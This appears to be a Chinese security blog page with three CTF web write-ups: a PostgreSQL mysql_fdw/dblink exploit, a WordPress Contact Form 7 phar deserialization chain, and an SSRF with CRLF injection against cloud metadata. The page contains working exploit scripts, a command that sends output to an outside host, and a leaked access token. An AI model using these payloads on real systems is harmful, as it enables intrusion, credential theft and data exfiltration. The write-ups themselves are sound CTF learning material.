<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="https://www.ccreater.top/index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-real world ctf 2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/14/real%20world%20ctf%202020/" class="article-date">
  <time class="dt-published" datetime="2021-01-14T06:02:02.063Z" itemprop="datePublished">2021-01-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/14/real%20world%20ctf%202020/">real world ctf 2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Real-World-CTF-2020"><a href="#Real-World-CTF-2020" class="headerlink" title="Real World CTF 2020"></a>Real World CTF 2020</h1><p>比赛很棒，题目很好，我很菜</p>
<h2 id="DBaaSadge"><a href="#DBaaSadge" class="headerlink" title="DBaaSadge"></a>DBaaSadge</h2><p>就一个PostgreSQL任意语句执行，给的权限不是superuser，但大部分操作是能进行的</p>
<pre><code class="php">&lt;?php
error_reporting(0);

if(!$sql=(string)$_GET[&quot;sql&quot;]){
  show_source(__FILE__);
  die();
}

header(&#39;Content-Type: text/plain&#39;);

if(strlen($sql)&gt;100){
  die(&#39;That query is too long ;_;&#39;);
}

if(!pg_pconnect(&#39;dbname=postgres user=realuser&#39;)){
  die(&#39;DB gone ;_;&#39;);
}

if($query = pg_query($sql)){
  print_r(pg_fetch_all($query));
} else {
  die(&#39;._.?&#39;);
}
</code></pre>
<p>题目提供了docker文件</p>
<p>看下Dockerfile发现：</p>
<pre><code>安装了postgresql-10-mysql-fdw
还开启了dblink</code></pre><p>相关的介绍文章：</p>
<p><a href="https://www.percona.com/blog/2018/08/21/foreign-data-wrappers-postgresql-postgres_fdw/" target="_blank" rel="noopener">https://www.percona.com/blog/2018/08/21/foreign-data-wrappers-postgresql-postgres_fdw/</a></p>
<p><a href="https://www.postgresql.org/docs/10/contrib-dblink-function.html" target="_blank" rel="noopener">https://www.postgresql.org/docs/10/contrib-dblink-function.html</a></p>
<p>一个是远程连接mysql，一个是远程连接postgresql 。</p>
<p>mysql客户端有个非常有名的漏洞：<code>Load data local infile &#39;/etc/passwd&#39; into table proc;</code>，即客户端文件读取，利用<a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a> 搭建一个恶意mysql服务端成功读取到文件</p>
<pre><code>CREATE SERVER q FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host&#39;ccreater.top&#39;,port&#39;63306&#39;)
CREATE USER MAPPING FOR realuser SERVER q OPTIONS (username &#39;a&#39;, password &#39;a&#39;);
CREATE FOREIGN TABLE c (id int)SERVER q OPTIONS(dbname &#39;a&#39;,table_name &#39;a&#39;)
select * from c</code></pre><p>结合dblink很自然的想到读取postgress数据库存储文件获得superuser密码再任意命令执行</p>
<p>通过本地搭建环境获得数据库文件位置：/var/lib/postgresql/10/main/base</p>
<p>已查找一下postgresql为关键词查找文件得到密码所在文件：</p>
<p><code>/var/lib/postgresql/10/main/global/1260</code></p>
<p>查找一下postgresql的加密规则：md5(password+username)</p>
<p>exp.py</p>
<pre><code class="python">
import requests

sqls=[
      &quot;CREATE SERVER q FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host&#39;ccreater.top&#39;,port&#39;63306&#39;)&quot;,
      &quot;CREATE USER MAPPING FOR realuser SERVER q OPTIONS (username &#39;a&#39;, password &#39;a&#39;)&quot;,
      &quot;CREATE FOREIGN TABLE c (id int)SERVER q OPTIONS(dbname &#39;a&#39;,table_name &#39;a&#39;)&quot;,
      &quot;select * from c&quot;
]
sqls=[
      &quot;select dblink(&#39;host=0 password=jpr5q&#39;,&#39;copy(select)to program&#39;&#39;curl y5pwcd.ceye.io/`/readflag`&#39;&#39;&#39;)&quot;
]
def hack(sql):
      burp0_url = &quot;http://54.219.197.26:60080/&quot;
      burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;}
      r= requests.get(burp0_url, headers=burp0_headers,params={
            &quot;sql&quot;:sql
      })
      print(r.text)

for sql in sqls:
      hack(sql)</code></pre>
<p>rwctf{pop_cat_says_p1ea5e_upd4t3_youR_libmysqlclient_kekW}</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/2021/01/14/real">https://www.ccreater.top/2021/01/14/real</a> world ctf 2020/](<a href="https://www.ccreater.top/2021/01/14/real">https://www.ccreater.top/2021/01/14/real</a> world ctf 2020/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/2021/01/14/real%20world%20ctf%202020/" data-id="ckmn5dces005ljsni13so9lkt" data-title="real world ctf 2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020xnuca_ezwp题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="2020-12-14T12:29:57.146Z" itemprop="datePublished">2020-12-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020-xnuca-ezwp题解"><a href="#2020-xnuca-ezwp题解" class="headerlink" title="2020 xnuca ezwp题解"></a>2020 xnuca ezwp题解</h1><p>wpscan扫一波发现wp是最新版本</p>
<p>本地搭好环境后，登入后台发现，有个插件是n年前的版本，很明显漏洞点在这</p>
<p>漏洞分析：<a href="https://paper.seebug.org/774/" target="_blank" rel="noopener">https://paper.seebug.org/774/</a></p>
<p>对wp和插件对比以下官方下载的，存在以下差异</p>
<h2 id="文件对比"><a href="#文件对比" class="headerlink" title="文件对比"></a>文件对比</h2><h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><p>/wp-admin/includes/class-wp-screen.php 294行</p>
<hr>
<p>官方</p>
<pre><code>if ( isset( $_GET[&#39;post&#39;] ) &amp;&amp; isset( $_POST[&#39;post_ID&#39;] ) &amp;&amp; (int) $_GET[&#39;post&#39;] !== (int) $_POST[&#39;post_ID&#39;] ) {
                        wp_die( __( &#39;A post ID mismatch has been detected.&#39; ), __( &#39;Sorry, you are not allowed to edit this item.&#39; ), 400 );
                    } elseif ( isset( $_GET[&#39;post&#39;] ) ) {
                        $post_id = (int) $_GET[&#39;post&#39;];
                    } elseif ( isset( $_POST[&#39;post_ID&#39;] ) ) {
                        $post_id = (int) $_POST[&#39;post_ID&#39;];
                    } else {
                        $post_id = 0;
                    }</code></pre><p>题目</p>
<pre><code>if ( isset( $_GET[&#39;post&#39;] ) ) {
                        $post_id = (int) $_GET[&#39;post&#39;];
                    } elseif ( isset( $_POST[&#39;post_ID&#39;] ) ) {
                        $post_id = (int) $_POST[&#39;post_ID&#39;];
                    } else {
                        $post_id = 0;
                    }</code></pre><hr>
<p>/wp-admin/includes/file.php 762行加了一个文件名不能包含php的waf（只检测了小写）</p>
<p>官方</p>
<pre><code>空</code></pre><p>题目</p>
<pre><code>if ( (stristr(file_get_contents($file[&#39;tmp_name&#39;]), &quot;php&quot;) !== FALSE) ) {
        return call_user_func_array( $upload_error_handler, array( &amp;$file, __( &#39;Sorry, this file content is not permitted for security reasons.&#39; ) ) );
    }</code></pre><hr>
<p>/wp-admin/includes/post.php 221</p>
<p>array_diff_key 参数少了’file’</p>
<p>官方</p>
<pre><code>return array_diff_key( $post_data, array_flip( array( &#39;meta_input&#39;, &#39;file&#39;, &#39;guid&#39; ) ) );</code></pre><p>题目</p>
<pre><code>return array_diff_key( $post_data, array_flip( array( &#39;meta_input&#39;, &#39;guid&#39; ) ) );</code></pre><hr>
<p>wp-admin/post.php 19行，少了很多条件</p>
<p>官方</p>
<pre><code>if ( isset( $_GET[&#39;post&#39;] ) &amp;&amp; isset( $_POST[&#39;post_ID&#39;] ) &amp;&amp; (int) $_GET[&#39;post&#39;] !== (int) $_POST[&#39;post_ID&#39;] ) {
    wp_die( __( &#39;A post ID mismatch has been detected.&#39; ), __( &#39;Sorry, you are not allowed to edit this item.&#39; ), 400 );
} elseif ( isset( $_GET[&#39;post&#39;] ) ) {
    $post_id = (int) $_GET[&#39;post&#39;];
} elseif ( isset( $_POST[&#39;post_ID&#39;] ) ) {
    $post_id = (int) $_POST[&#39;post_ID&#39;];
} else {
    $post_id = 0;
}</code></pre><p>题目</p>
<pre><code>if ( isset( $_GET[&#39;post&#39;] ) ) {
    $post_id = (int) $_GET[&#39;post&#39;];
} elseif ( isset( $_POST[&#39;post_ID&#39;] ) ) {
    $post_id = (int) $_POST[&#39;post_ID&#39;];
} else {
    $post_id = 0;
}</code></pre><p>wp-includes\Requests\Utility\FilteredIterator.php<br>删除了:</p>
<pre><code>public function unserialize( $serialized ) {
    }

    /**
     * @inheritdoc
     */
    public function __unserialize( $serialized ) { // phpcs:ignore PHPCompatibility.FunctionNameRestrictions.ReservedFunctionNames.MethodDoubleUnderscore,PHPCompatibility.FunctionNameRestrictions.NewMagicMethods.__unserializeFound
    }

    public function __wakeup() { // phpcs:ignore PHPCompatibility.FunctionNameRestrictions.ReservedFunctionNames.MethodDoubleUnderscore,PHPCompatibility.FunctionNameRestrictions.NewMagicMethods.__wakeupFound
        unset( $this-&gt;callback );
    }</code></pre><h3 id="contact-form-7"><a href="#contact-form-7" class="headerlink" title="contact form 7"></a>contact form 7</h3><p>原来：<br>134行：</p>
<pre><code>    return wp_mail( $recipient, $subject, $body, $headers, $attachments );
}</code></pre><p>题目：</p>
<pre><code>return $this-&gt;send_mail( $recipient, $subject, $body, $headers, $attachments );
    }

    public function send_mail($to, $subject, $message, $headers = &#39;&#39;, $attachments = array()) {
        try {
            $host = explode(&quot;@&quot;, $to)[1];
            $url = &quot;http://$host&quot;;
            $post_data = array(
                &quot;subject&quot; =&gt; $subject,
                &quot;message&quot; =&gt; $message,
                &quot;headers&quot; =&gt; $headers
            );
            if ($attachments !== array()) {
                if (!empty($attachments[0])) {
                    $post_data[&quot;file&quot;] = curl_file_create($attachments[0]);
                }
            }
            $ch = curl_init();
            curl_setopt($ch , CURLOPT_URL , $url);
            curl_setopt($ch , CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch , CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);
            curl_setopt($ch , CURLOPT_POSTFIELDS, $post_data);
            $data = curl_exec($ch);
            curl_close($ch);
            if ($data) {
                file_put_contents(&quot;/tmp/1.log&quot;, $data);
            }
            return true;
        } catch (Exception $e) {
            return false;
        }
    }</code></pre><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>跟以下之前的漏洞发现，漏洞点调用了wp_mail，而题目改成了send_mail，里面的存在文件系统相关的函数，加上题目删除反序列化的方法，大概率思路就是利用之前的漏洞+反序列化getshell</p>
<h2 id="绕过最新版本wp限制来利用历史漏洞"><a href="#绕过最新版本wp限制来利用历史漏洞" class="headerlink" title="绕过最新版本wp限制来利用历史漏洞"></a>绕过最新版本wp限制来利用历史漏洞</h2><p>利用原来的payload直接打过去发现不太行，跟踪发现：</p>
<p>/wp-admin/includes/post.php 221：</p>
<p><code>return array_diff_key( $post_data, array_flip( array( &#39;meta_input&#39;, &#39;guid&#39; ) ) );</code></p>
<p>最新版wp对post数据进行了过滤，删除了meta_input和guid的键，导致我们无法写入postmeta,继续跟踪发现有个地方可以用别的键写入postmeta:</p>
<p>/wp-admin/includes/post.php 872：</p>
<p><code>add_meta( $post_ID );</code></p>
<pre><code class="php">function add_meta( $post_ID ) {
    $post_ID = (int) $post_ID;

    $metakeyselect = isset( $_POST[&#39;metakeyselect&#39;] ) ? wp_unslash( trim( $_POST[&#39;metakeyselect&#39;] ) ) : &#39;&#39;;
    $metakeyinput  = isset( $_POST[&#39;metakeyinput&#39;] ) ? wp_unslash( trim( $_POST[&#39;metakeyinput&#39;] ) ) : &#39;&#39;;
    $metavalue     = isset( $_POST[&#39;metavalue&#39;] ) ? $_POST[&#39;metavalue&#39;] : &#39;&#39;;
    if ( is_string( $metavalue ) ) {
        $metavalue = trim( $metavalue );
    }

    if ( ( ( &#39;#NONE#&#39; !== $metakeyselect ) &amp;&amp; ! empty( $metakeyselect ) ) || ! empty( $metakeyinput ) ) {
        /*
         * We have a key/value pair. If both the select and the input
         * for the key have data, the input takes precedence.
         */
        if ( &#39;#NONE#&#39; !== $metakeyselect ) {
            $metakey = $metakeyselect;
        }

        if ( $metakeyinput ) {
            $metakey = $metakeyinput; // Default.
        }

        if ( is_protected_meta( $metakey, &#39;post&#39; ) || ! current_user_can( &#39;add_post_meta&#39;, $post_ID, $metakey ) ) {
            return false;
        }

        $metakey = wp_slash( $metakey );

        return add_post_meta( $post_ID, $metakey, $metavalue );
    }

    return false;
}</code></pre>
<p>但是这里有个is_protected_meta,跟进去发现这个函数限制了我们的键不能以<code>_</code>开头，按照原来的payload，到这里好像死路了。</p>
<p>但是我们跟踪以下插件渲染表单的代码发现</p>
<p>contact-form.php:129</p>
<p>class WPCF7_ContactForm</p>
<pre><code class="php">private function __construct( $post = null ) {
        $post = get_post( $post );

        if ( $post &amp;&amp; self::post_type == get_post_type( $post ) ) {
            $this-&gt;id = $post-&gt;ID;
            $this-&gt;name = $post-&gt;post_name;
            $this-&gt;title = $post-&gt;post_title;
            $this-&gt;locale = get_post_meta( $post-&gt;ID, &#39;_locale&#39;, true );

            $properties = $this-&gt;get_properties();

            foreach ( $properties as $key =&gt; $value ) {
                if ( metadata_exists( &#39;post&#39;, $post-&gt;ID, &#39;_&#39; . $key ) ) {
                    $properties[$key] = get_post_meta( $post-&gt;ID, &#39;_&#39; . $key, true );
                } elseif ( metadata_exists( &#39;post&#39;, $post-&gt;ID, $key ) ) {
                    $properties[$key] = get_post_meta( $post-&gt;ID, $key, true );
                }
            }

            $this-&gt;properties = $properties;
            $this-&gt;upgrade();
        }

        do_action( &#39;wpcf7_contact_form&#39;, $this );
    }</code></pre>
<p>contact form 的属性啥的就是从<code>$properties</code>中取出(<code>_mail</code>就在这里面)，想要利用历史漏洞我们必须能够控制<code>_mail</code>的值</p>
<p><code>metadata_exists( &#39;post&#39;, $post-&gt;ID, &#39;_&#39; . $key )</code>:它先会去表中查找<code>&quot;_&quot;.&quot;mail&quot;</code>这个属性，没有的话再去查找<code>&quot;mail&quot;</code>属性，正好我们前面找到一个可以控制非<code>_</code>开头的postmeta</p>
<p>于是构造</p>
<pre><code class="javascript">var settings = {
    &quot;async&quot;: true,
    &quot;crossDomain&quot;: true,
    &quot;url&quot;: &quot;/wp-admin/post.php?post=1&quot;,
    &quot;method&quot;: &quot;POST&quot;,
    &quot;data&quot;: {
        &quot;_wpnonce&quot;: document.getElementById(&quot;_wpnonce&quot;).value,
        &quot;_wp_http_referer&quot;: &quot;%2Fwp-admin%2Fpost-new.php&quot;,
        &quot;user_ID&quot;: &quot;3&quot;,
        &quot;action&quot;: &quot;post&quot;,
        &quot;originalaction&quot;: &quot;editpost&quot;,
        &quot;post_author&quot;: &quot;3&quot;,
        &quot;post_type&quot;: &quot;wpcf7_contact_form&quot;,
        &quot;original_post_status&quot;: &quot;auto-draft&quot;,
        &quot;auto_draft&quot;: &quot;&quot;,
        &quot;post_title&quot;: &quot;readflagtotmp2log&quot;,
        &quot;content&quot;: &quot;test&quot;,
        &quot;wp-preview&quot;: &quot;&quot;,
        &quot;hidden_post_status&quot;: &quot;draft&quot;,
        &quot;post_status&quot;: &quot;draft&quot;,
        &quot;hidden_post_password&quot;: &quot;&quot;,
        &quot;hidden_post_visibility&quot;: &quot;public&quot;,
        &quot;visibility&quot;: &quot;public&quot;,
        &quot;post_password&quot;: &quot;&quot;,
        &quot;mm&quot;: &quot;12&quot;,
        &quot;jj&quot;: &quot;22&quot;,
        &quot;_thumbnail_id&quot;: &quot;-1&quot;,
        &quot;advanced_view&quot;: &quot;1&quot;,
        &quot;comment_status&quot;: &quot;open&quot;,
        &quot;ping_status&quot;: &quot;open&quot;,
        &quot;post_name&quot;: &quot;&quot;,
        &quot;metakeyinput&quot;:&quot;mail&quot;,
        &quot;metavalue[subject]&quot;: &quot;test \&quot;[your-subject]\&quot;&quot;,
        &quot;metavalue[sender]&quot;: &quot;2&quot;,
        &quot;metavalue[recipient]&quot;: &quot;ccreater@172.16.8.6:60000&quot;,
        &quot;metavalue[body]&quot;: &quot;From: [your-name] &lt;[your-email]&gt;\\nSubject: [your-subject]\\n\\nMessage Body:\\n[your-message]\\n\\n-- \\n&quot;,
        &quot;metavalue[additional_headers]&quot;: &quot;Reply-To: [your-email]&quot;,
        &quot;metavalue[attachments]&quot;: &quot;phar://./wp-content/uploads/2020/12/phar.jpg&quot;,
        &quot;metavalue[use_html]&quot;: &quot;false&quot;,
        &quot;metavalue[exclude_blank]&quot;: &quot;false&quot;,
        &quot;metakeyselect&quot;:&quot;#NONE#&quot;

    }
}
jQuery.ajax(settings).done(function (response) {
    console.log(response);
});</code></pre>
<p>在dashboard那里执行这个js</p>
<p>成功写入<code>mail</code>:</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201208232404.png" alt="image8421"></p>
<p>因为没有<code>_form</code>属性（上面那个设置postmeta的一次只能设置一个），所以我们要手动提交<code>jQuery(&quot;.wpcf7-form&quot;).submit()</code>，接着就可以读取文件和反序列化了</p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><pre><code class="php">&lt;?php

namespace Kigkonsult\Icalcreator{
    class Vtimezone{
        public $timezonetype;
        public $components;
        public function __construct($val)
        {
            $this-&gt;components = $val;
        }
    }
}
namespace {

    require( &#39;wp-load.php&#39; );  //???????
    require_once( dirname( __FILE__ ) . &#39;/wp-includes/Requests/Utility/FilteredIterator.php&#39; );
    $arr  = array(
        &quot;1&quot; =&gt; &quot;/readflag&gt;/tmp/2.log&quot;  //payload
    );
    $obj_ = new Requests_Utility_FilteredIterator( $arr, &quot;system&quot; );
    $obj  = new Kigkonsult\Icalcreator\Vtimezone( $obj_ );


    @unlink( &quot;test.gif&quot; );
    $phar = new Phar( &quot;test.phar&quot; );
    $phar-&gt;startBuffering();
    $phar-&gt;setStub( base64_decode( &quot;/9j/4AAQSkZJRgABAgEASABIAAD//gARSlBFRyBJbWFnZXIgMi4x/9sAhAAGBAUGBQQGBgUGBwcGCAoQCgoJCQoUDg8MEBcUGBgXFBYWGh0lHxobIxwWFiAsICMmJykqKRkfLTAtKDAlKCkoAQMEBAUE&quot; ) . &quot; __HALT_COMPILER(); ?&gt;&quot; );
    $phar-&gt;setMetadata( $obj );
    $phar-&gt;addFromString( &quot;test.txt&quot;, &quot;test&quot; ); //????????
    //??????
    $phar-&gt;stopBuffering();
    rename( &quot;test.phar&quot;, &quot;test.gif&quot; );
}
</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/12/14/2020xnuca_ezwp题解/">https://www.ccreater.top/2020/12/14/2020xnuca_ezwp题解/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/" data-id="ckmn5dccp0005jsnicfupd7xr" data-title="2020xnuca_ezwp题解" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020 balsn ctf web 部分题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/27/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="2020-11-27T09:52:36.095Z" itemprop="datePublished">2020-11-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/27/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020-BalsnCTF-web-部分题解"><a href="#2020-BalsnCTF-web-部分题解" class="headerlink" title="2020 BalsnCTF web 部分题解"></a>2020 BalsnCTF web 部分题解</h1><p>文章首发于<a href="https://www.anquanke.com/post/id/222675" target="_blank" rel="noopener">安全客</a></p>
<p>题目文件：<a href="https://pan.baidu.com/s/1utpM99xbMNCX7m7J26WedQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1utpM99xbMNCX7m7J26WedQ</a><br>提取码：v7qg </p>
<h2 id="tpc"><a href="#tpc" class="headerlink" title="tpc"></a>tpc</h2><p><a href="http://35.194.175.80:8000/" target="_blank" rel="noopener">http://35.194.175.80:8000/</a></p>
<p>题目说flag就在工作目录下并且不可以暴力猜解出文件名</p>
<p>试着file协议，发现可以任意文件读取，那么我们首先要做的是试着读取源文件</p>
<p>读取/proc/self/cmdline查看启动命令</p>
<p><code>/usr/local/bin/python /usr/local/bin/gunicorn main-dc1e2f5f7a4f359bb5ce1317a:app --bind 0.0.0.0:8000 --workers 5 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -</code></p>
<p>谷歌以下gunicorn的用法很容易知道源文件就是<code>main-dc1e2f5f7a4f359bb5ce1317a.py</code></p>
<p>再读取/proc/self/environ查看环境变量</p>
<pre><code>HOSTNAME=tpc-1PYTHON_PIP_VERSION=19.0.3SHLVL=1HOME=/home/ggGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binLANG=C.UTF-8PYTHON_VERSION=3.7.2PWD=/opt/workdir</code></pre><p>于是就知道源文件在 /opt/workdir/main-dc1e2f5f7a4f359bb5ce1317a.py</p>
<pre><code class="python">import urllib.request

from flask import Flask, request

app = Flask(__name__)


@app.route(&quot;/query&quot;)
def query():
    site = request.args.get(&#39;site&#39;)
    text = urllib.request.urlopen(site).read()
    return text


@app.route(&quot;/&quot;)
def hello_world():
    return &quot;/query?site=[your website]&quot;


if __name__ == &quot;__main__&quot;:
    app.run(debug=False, host=&quot;0.0.0.0&quot;, port=8000)
</code></pre>
<p>就提供了一个很简单的ssrf功能，那么为了找到下一步的思路，就必须收集更多信息，用字典fuzz一下得到以下关键信息</p>
<p>/proc/1/net/arp</p>
<pre><code>172.17.0.4       0x1         0x0         00:00:00:00:00:00     *        docker0
172.17.0.3       0x1         0x0         00:00:00:00:00:00     *        docker0
172.17.0.2       0x1         0x2         02:42:ac:11:00:02     *        docker0
10.140.0.1       0x1         0x2         42:01:0a:8c:00:01     *        eth0</code></pre><p>/etc/hosts</p>
<pre><code># /etc/hosts: Local Host Database
#
# This file describes a number of aliases-to-address mappings for the for 
# local hosts that share this file.
#
# In the presence of the domain name service or NIS, this file may not be 
# consulted at all; see /etc/host.conf for the resolution order.
#

# IPv4 and IPv6 localhost aliases
127.0.0.1    localhost
::1        localhost

#
# Imaginary network.
#10.0.0.2               myname
#10.0.0.3               myfriend
#
# According to RFC 1918, you can use the following IP networks for private 
# nets which will never be connected to the Internet:
#
#       10.0.0.0        -   10.255.255.255
#       172.16.0.0      -   172.31.255.255
#       192.168.0.0     -   192.168.255.255
#
# In case you want to be able to connect directly to the Internet (i.e. not 
# behind a NAT, ADSL router, etc...), you need real official assigned 
# numbers.  Do not try to invent your own network numbers but instead get one 
# from your network provider (if any) or from your regional registry (ARIN, 
# APNIC, LACNIC, RIPE NCC, or AfriNIC.)
#
169.254.169.254 metadata.google.internal metadata</code></pre><p>hosts文件里面添加了一条特殊的记录，谷歌一下发现里面存放着实例的一些数据</p>
<p>直接访问<code>metadata.google.internal</code>，得到：</p>
<p><code>0.1/ computeMetadata/</code></p>
<p>继续访问下一级目录发现500了</p>
<p>阅读<a href="https://cloud.google.com/compute/docs/storing-retrieving-metadata#querying" target="_blank" rel="noopener">文档</a>得知要加入<code>Metadata-Flavor: Google</code>请求头</p>
<p>python的urlllib库之前爆出存在着CRLF的漏洞，利用这个来绕过</p>
<p><code>&quot;http://35.194.175.80:8000/query?site=http://metadata.google.internal/PATH/%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0apadding:&quot;</code></p>
<p>写个脚本读取所有数据：</p>
<pre><code class="python">import requests

def req(parent,path):
    burp0_url = &quot;http://35.194.175.80:8000/query?site=http://metadata.google.internal&quot;+parent+path+&quot;%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0apadding:&quot;
    return requests.get(burp0_url)


def getInfo(parent,path):
    r = req(parent,path)
    if r.status_code == 500:
        return
    print(parent+path)
    print(r.text)
    print(&quot;----------------------------------------------------------------------&quot;)
    if not path.endswith(&quot;/&quot;):
        return
    child = r.text.splitlines()
    parent=parent+path
    for i in child:

        getInfo(parent,i)

getInfo(parent=&quot;&quot;,path=&quot;/&quot;)</code></pre>
<p>得到以下数据（只显示对题目有用的数据）</p>
<pre><code>...
----------------------------------------------------------------------
/computeMetadata/v1/project/project-id
balsn-ctf-2020-tpc
------------------------------------------------------------------
/computeMetadata/v1/instance/service-accounts/default/token
{&quot;access_token&quot;:&quot;ya29.c.KpcB5QdRi_ofZUDT6YcnsZrXwex0ocEfddkf1cL9qgsBVUuJI6xm7X__zkSxCc4jbw35HGJ2ZSbVUQljIKqOWbe_-q33It_9ip0sO15lH8usKPuj1I-vg2BHQeyizyWloiDf2vlRbL0EiZNaiKa3_tGFFEbxt9JrmsfYxWoN3_VOn3cqTbjNyEdj3-Xr3oQUiD0ESz0H2NS4Lg&quot;,&quot;expires_in&quot;:3147,&quot;token_type&quot;:&quot;Bearer&quot;}
----------------------------------------------------------------------
